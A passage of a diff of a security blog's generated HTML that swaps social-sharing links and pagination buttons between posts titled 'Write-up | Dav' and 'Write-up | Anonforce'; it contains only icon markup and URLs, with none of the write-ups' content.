     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
     </div>
@@ -314,7 +351,7 @@ www-data
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fdav-writeup%2f;title=Write-up%20%7c%20Dav" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fanonforce-writeup%2f;title=Write-up%20%7c%20Anonforce" target="_blank" rel="noopener" aria-label="" title="Share on xing">
   <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
     </div>
@@ -322,7 +359,7 @@ www-data
 </a>
 
 
-<a class="resp-sharing-button__link" href="whatsapp://send?text=Write-up%20%7c%20Dav%20https%3a%2f%2fblog.hugoblanc.com%2fposts%2fdav-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+<a class="resp-sharing-button__link" href="whatsapp://send?text=Write-up%20%7c%20Anonforce%20https%3a%2f%2fblog.hugoblanc.com%2fposts%2fanonforce-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
   <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
     </div>
@@ -330,7 +367,7 @@ www-data
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fdav-writeup%2f&amp;t=Write-up%20%7c%20Dav" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fanonforce-writeup%2f&amp;t=Write-up%20%7c%20Anonforce" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
   <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
 			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
     </div>
@@ -338,7 +375,7 @@ www-data
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Write-up%20%7c%20Dav&amp;url=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fdav-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Write-up%20%7c%20Anonforce&amp;url=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fanonforce-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
   <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
     </div>
@@ -356,18 +393,11 @@ www-data
 
         <div class="pagination__buttons">
           
-            <span class="button previous">
-              <a href="https://blog.hugoblanc.com/posts/anonforce-writeup/">
-                <span class="button__icon">←</span>
-                <span class="button__text">Write-up | Anonforce</span>
-              </a>
-            </span>
-          
 
           
             <span class="button next">
-              <a href="https://blog.hugoblanc.com/posts/break-out-the-cage-writeup/">
-                <span class="button__text">Write-up | Break Out the Cage</span>
+              <a href="https://blog.hugoblanc.com/posts/dav-writeup/">
+                <span class="button__text">Write-up | Dav</span>
                 <span class="button__icon">→</span>
               </a>
             </span>
